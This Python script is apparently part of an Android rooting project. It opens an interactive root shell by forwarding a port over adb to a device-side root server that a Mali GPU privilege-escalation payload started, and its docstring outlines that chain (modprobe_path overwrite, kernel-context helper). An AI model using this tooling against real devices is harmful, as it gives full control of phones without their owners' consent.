#!/usr/bin/env python3
"""Interactive uid-0 shell over the rootd/rootsrv channel.

The Mali LPE payload rewrites modprobe_path and the kernel executes
/data/local/tmp/mp with init_cred.  That helper starts rootd (command file
channel) and rootsrv (127.0.0.1:45679).  rootsrv runs in u:r:kernel:s0 with
uid 0 and full capabilities.

Usage:
    python src/probe/rootshell.py [port]

It sets up `adb forward tcp:<port> tcp:<port>` and proxies this terminal to
the device-side shell.
"""
import os
import socket
import subprocess
import sys
import threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 45679


def main():
    subprocess.run(["adb", "forward", "tcp:%d" % PORT, "tcp:%d" % PORT],
                   check=False)
    try:
        s = socket.create_connection(("127.0.0.1", PORT), timeout=5)
    except OSError as e:
        sys.exit("rootsrv is not listening on %d (%s); re-run the payload" % (PORT, e))
    s.settimeout(None)
    s.sendall(b"id; export PS1='hlk-root# '\n")

    stop = threading.Event()

    def rx():
        while not stop.is_set():
            try:
                data = s.recv(65536)
            except OSError:
                break
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        stop.set()
        sys.stderr.write("\n[rootshell] connection closed\n")

    threading.Thread(target=rx, daemon=True).start()
    try:
        while not stop.is_set():
            line = sys.stdin.buffer.readline()
            if not line:
                break
            s.sendall(line)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        try:
            s.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()
